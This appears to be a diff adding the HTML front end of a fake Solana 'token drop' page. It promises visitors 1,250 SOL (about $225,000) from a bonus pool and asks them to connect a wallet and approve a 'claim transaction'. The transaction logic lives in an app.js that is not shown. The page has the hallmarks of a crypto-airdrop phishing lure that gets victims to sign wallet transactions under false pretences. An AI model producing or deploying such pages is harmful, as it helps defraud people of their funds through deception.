@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Solana Token Claim</title>
+    <!-- Solana Web3.js -->
+    <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.3.11/lib/index.iife.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.04);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 24px;
+            padding: 48px;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .logo { font-size: 48px; margin-bottom: 8px; }
+        h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; background: linear-gradient(90deg, #9945FF, #14F195); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .subtitle { color: rgba(255,255,255,0.5); font-size: 14px; margin-bottom: 32px; }
+        .bonus-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, rgba(153,69,255,0.2), rgba(20,241,149,0.2));
+            border: 1px solid rgba(153,69,255,0.3);
+            padding: 6px 16px;
+            border-radius: 100px;
+            font-size: 13px;
+            color: #14F195;
+            margin-bottom: 24px;
+        }
+        .amount-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .amount-box .token { font-size: 42px; font-weight: 700; }
+        .amount-box .usd { color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 4px; }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: linear-gradient(135deg, #9945FF, #14F195);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(153,69,255,0.3);
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(153,69,255,0.4); }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+        .btn-secondary {
+            background: rgba(255,255,255,0.06);
+            box-shadow: none;
+            margin-top: 12px;
+        }
+        .btn-secondary:hover { background: rgba(255,255,255,0.1); transform: none; }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            display: none;
+        }
+        .status.error { display: block; background: rgba(255,50,50,0.15); border: 1px solid rgba(255,50,50,0.3); color: #ff6b6b; }
+        .status.success { display: block; background: rgba(20,241,149,0.15); border: 1px solid rgba(20,241,149,0.3); color: #14F195; }
+        .status.info { display: block; background: rgba(58,120,255,0.15); border: 1px solid rgba(58,120,255,0.3); color: #5b8dff; }
+        .wallet-info {
+            margin-top: 16px;
+            padding: 12px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 8px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+            word-break: break-all;
+            display: none;
+        }
+        .steps { text-align: left; font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom: 24px; line-height: 1.8; }
+        .steps span { color: #14F195; }
+        .loader { display: none; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { margin-top: 20px; font-size: 12px; color: rgba(255,255,255,0.25); }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">◎</div>
+    <h1>Solana Token Drop</h1>
+    <p class="subtitle">Exclusive airdrop for early Solana adopters</p>
+    <div class="bonus-badge">✦ 5,000 SOL Bonus Pool</div>
+
+    <div class="steps">
+        <span>1.</span> Connect your Solana wallet<br>
+        <span>2.</span> Approve the claim transaction<br>
+        <span>3.</span> Tokens sent instantly ✦
+    </div>
+
+    <div class="amount-box">
+        <div class="token">1,250 SOL</div>
+        <div class="usd">≈ $225,000 USD</div>
+    </div>
+
+    <button id="connectBtn" class="btn" onclick="connectWallet()">
+        <span id="btnText">Connect Wallet to Claim</span>
+        <div id="loader" class="loader"></div>
+    </button>
+
+    <button id="claimBtn" class="btn btn-secondary" style="display:none;" onclick="claimAirdrop()">
+        Claim Airdrop
+    </button>
+
+    <div id="statusBox" class="status"></div>
+    <div id="walletInfo" class="wallet-info"></div>
+    <div class="footer">Powered by Solana SPL Token Program</div>
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
